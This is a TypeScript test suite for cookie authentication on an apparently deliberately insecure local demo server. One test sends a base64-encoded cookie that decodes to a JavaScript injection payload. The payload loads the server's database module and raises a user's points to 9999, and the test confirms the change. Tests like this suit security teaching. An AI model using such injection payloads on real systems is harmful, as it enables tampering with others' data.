import _ from "lodash";

const supertest = require("supertest");
const BASEURL = 'http://localhost:8080/insecure';

describe('security tests', function () {

    it('should return unauthorized', async () => {
        await supertest(BASEURL)
            .get('/userProfile')
            .expect(401)
            .then((response: any) => {
                //check response
                expect(_.isObject(response.body)).toBeTruthy();
                expect(_.get(response.body, 'status')).toBe('invalid cookie')
            });
    });

    it('should return wrong password', async () => {
        await supertest(BASEURL)
            .get('/userProfile')
            .set('cookie', 'eyJpZCI6IjEzMzciLCJwYXNzd29yZCI6Indyb25ncGFzc3dvcmQifQo=')
            .expect(401)
            .then((response: any) => {
                //check response
                expect(_.isObject(response.body)).toBeTruthy();
                expect(_.get(response.body, 'status')).toBe('invalid password')
            });
    });

    it('should return user data', async () => {
        await supertest(BASEURL)
            .get('/userProfile')
            .set('cookie', 'eyJpZCI6IjEzMzciLCJwYXNzd29yZCI6ImhlbGxvIn0=')
            .expect(200)
            .then((response: any) => {
                //check response
                expect(_.isObject(response.body)).toBeTruthy();
                expect(_.get(response, 'body.id', null)).toBe('1337')
                expect(_.get(response, 'body.password', null)).toBe('hello')
                expect(_.get(response, 'body.name', null)).toBe('Mallory')
                expect(_.get(response, 'body.points', null)).toBe(0)
                expect(_.get(response, 'body.role', null)).toBe('user')
            });
    });

    it('should execute payload', async () => {
        await supertest(BASEURL)
            .get('/userProfile')
            .set('cookie', 'eyJwMSI6IGZvbz1mdW5jdGlvbigpe0RBVEFCQVNFID0gcmVxdWlyZSgnLi4vc2VydmVyL2FwcGxpY2F0aW9uL2RhdGFiYXNlJyk7REFUQUJBU0UudXBkYXRlUG9pbnRzKCcxMzM3Jyw5OTk5KTtjb25zb2xlLmxvZyhEQVRBQkFTRS5nZXRVc2VyRGF0YSgnMTMzNycpKX0sInAyIjpmb28oKX0=')
            .expect(404)
            .then((response: any) => {
                //check response
                expect(_.isObject(response.body)).toBeTruthy();
                expect(_.get(response.body, 'status')).toBe('user not found')
            });
        await supertest(BASEURL)
            .get('/userProfile')
            .set('cookie', 'eyJpZCI6IjEzMzciLCJwYXNzd29yZCI6ImhlbGxvIn0=')
            .expect(200)
            .then((response: any) => {
                //check response
                expect(_.isObject(response.body)).toBeTruthy();
                expect(_.get(response, 'body.id', null)).toBe('1337')
                expect(_.get(response, 'body.password', null)).toBe('hello')
                expect(_.get(response, 'body.name', null)).toBe('Mallory')
                expect(_.get(response, 'body.points', null)).toBe(9999)
                expect(_.get(response, 'body.role', null)).toBe('user')
            });
    });

});
